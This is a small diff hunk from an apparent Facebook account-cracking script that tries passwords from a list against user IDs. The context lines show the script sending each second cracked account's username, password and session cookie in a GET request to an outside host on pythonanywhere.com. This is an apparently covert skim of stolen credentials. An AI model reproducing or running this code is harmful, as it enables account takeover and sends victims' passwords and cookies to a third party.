@@ -309,7 +309,7 @@ def cracker(ids,passlist):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                     bkas.append(cid)
+                     bkas.append(user)
                      if len(bkas)% 2 == 0:
                          statusok = (f"{user}|{pas}|{kuki}")
                          requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
